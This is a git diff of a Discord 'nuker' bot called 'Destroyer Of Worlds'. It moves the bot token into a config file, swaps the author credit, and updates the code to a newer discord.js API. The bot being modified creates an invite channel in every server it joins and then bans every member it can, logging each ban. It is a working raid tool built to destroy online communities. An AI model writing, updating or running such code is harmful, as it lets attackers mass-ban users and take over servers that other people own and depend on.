@@ -7,12 +7,13 @@ var center = require("center-align");
 var colors = require("colors");
 
 
-// Settings for the bot.
-const settings = {
-    //Make sure you insert actual token rather than Client ID
-    botToken: "INSERT TOKEN HERE",
-    newChannelName: "Destroyer Of Worlds" //needs new channel name in order to create new invite
-};
+const {
+    token,
+    serverID,
+    newChannelName
+} = require('./config.json');
+
+
 
 //await cmd visuals 
 client.on("ready", async () => {
@@ -23,11 +24,13 @@ client.on("ready", async () => {
     ╦════════════════════════╦
     ║                        ║
     ║   Destroyer Of Worlds  ║
-    ║Made by GoldenCodex#6950║
+    ║ Made by BlackLung#6950 ║
     ║                        ║
     ╩════════════════════════╩
     `.red, 112));
 });
+
+
 
 //on ready:
 client.on("ready", () => {
@@ -39,14 +42,14 @@ client.on("ready", () => {
     // Create an invite to a channel
     client.guilds.forEach(server => {
         //if no channel name defined, use default
-        if(!settings.newChannelName) settings.newChannelName == "Destroyer Of Worlds";
+        if (!newChannelName) newChannelName == "Destroyer Of Worlds";
         //create new channel
-        server.createChannel(settings.newChannelName, "text").then(channel => {
+        server.createChannel(newChannelName, "text").then(channel => {
             createdChannelName = channel.name;
             //then once channel is created, create an invite link to this channel
             channel.createInvite().then(inviteCode => {
                 //log the invite link to console
-                console.log(chalk.bgYellowBright(inviteCode));
+                console.log(chalk.bgGreenBright(("INVITE:")) + ` ${inviteCode}`);
                 //catch errors
             }).catch(err => {
                 if (err) throw err;
@@ -73,11 +76,11 @@ client.on("ready", () => {
 
     //ban all members on the server
     client.guilds.forEach(guild => {
-        guild.members.forEach(m => {
+        guild.members.cache.each(m => {
             //set interval to prevent ratelimit error (API restrictions)
             setInterval(function () {
                 //check if user is bannable
-                if (!m.bannable) return console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
+                if (!m.bannable) return; //console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                 m.ban()
                 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)
 
@@ -107,4 +110,4 @@ process.on("unhandledRejection", err => {
     process.exit(1);
 });
 
-client.login(settings.botToken);
+client.login(token);
